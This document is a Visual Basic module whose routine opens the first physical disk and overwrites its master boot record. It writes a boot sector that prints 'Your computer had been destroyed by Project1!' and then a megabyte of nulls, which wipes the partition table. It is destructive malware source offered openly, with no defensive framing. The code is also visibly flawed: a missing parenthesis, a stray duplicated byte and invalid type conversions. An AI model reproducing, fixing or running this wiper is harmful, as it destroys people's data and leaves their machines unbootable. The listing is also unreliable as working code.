Attribute VB_Name = "MBR"
Private Declare Function CreateFile Lib "kernel32" Alias "CreateFileA" (ByVal lpFileName As String, ByVal dwDesiredAccess As Long, ByVal dwShareMode As Long, ByVal lpSecurityAttributes As Long, ByVal dwCreationDisposition As Long, ByVal dwFlagsAndAttributes As Long, ByVal hTemplateFile As Long) As Long
Private Declare Function WriteFile Lib "kernel32" (ByVal hFile As Long, lpBuffer As Any, ByVal nNumberOfBytesToWrite As Long, lpNumberOfBytesWritten As Long, ByVal lpOverlapped As Any) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long

Public Const GENERIC_READ = &H80000000
Public Const GENERIC_WRITE = &H40000000
Public Const GENERIC_EXECUTE = &H20000000
Public Const GENERIC_ALL = &H10000000
Public Const FILE_SHARE_READ = &H1
Public Const FILE_SHARE_WRITE = &H2
Public Const CREATE_NEW = 1
Public Const CREATE_ALWAYS = 2
Public Const OPEN_EXISTING = 3
Public Const OPEN_ALWAYS = 4
Public Const TRUNCATE_EXISTING = 5
Sub OverwriteMBR()
    Dim hFile As Long
    ReDim buffer(0 To 511) As Byte
    Dim bytesWritten As Long
    
        buffer = Array(Chr(&HE9), Chr(&H0), Chr(&H0), Chr(&HB4), Chr(&HE), Chr(&HB0), Chr(&H59), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H6F), Chr(&HCD), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H75), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H72), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0, Chr(&H20), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H63), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H6F), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H6D), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H70), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H75), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), _
        Chr(&H74), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H65), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H72), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H20), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H68), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H61), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H64), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H20), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H62), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H65), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H65), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H6E), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), _
        Chr(&H20), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H64), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H65), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H73), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H74), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H72), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H6F), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H79), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H65), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H64), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H20), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H62), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), _
        Chr(&H79), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H20), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H50), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H72), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H6F), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H6A), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H65), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H63), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H74), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H31), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H21), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H20), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HE9), _
        Chr(&H0), Chr(&H0), Chr(&HB4), Chr(&H6), Chr(&HB0), Chr(&H0), Chr(&HFE), Chr(&HC7), Chr(&HB5), Chr(&H0), Chr(&HB1), Chr(&H0), Chr(&HB6), Chr(&H19), Chr(&HB2), Chr(&H50), Chr(&HCD), Chr(&H10), Chr(&HE9), Chr(&HED), Chr(&HFF), Chr(&H50), Chr(&H52), Chr(&HB9), Chr(&H7), Chr(&H0), Chr(&HBA), Chr(&H40), Chr(&H42), Chr(&HB8), Chr(&H86), Chr(&H0), Chr(&HCD), Chr(&H15), Chr(&H5A), Chr(&H58), Chr(&HC3), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), _
        Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), _
        Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), _
        Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), _
        Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H55), Chr(&HAA))
    hFile = CreateFile("\\.\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ Or FILE_SHARE_WRITE, ByVal 0&, OPEN_EXISTING, ByVal 0&, ByVal 0&)
        If hFile = &HFFFFFFFF Then RaiseError
        WriteFile hFile, buffer(0), UBound(buffer) + 1, bytesWritten, ByVal 0&
        If bytesWritten < UBound(buffer) + 1 Then RaiseError
        WriteFile hFile, String(1048576, vbNullString), 1048576, bytesWritten, ByVal 0&
        If bytesWritten < 1048576 Then RaiseError
    CloseHandle hFile
End Sub
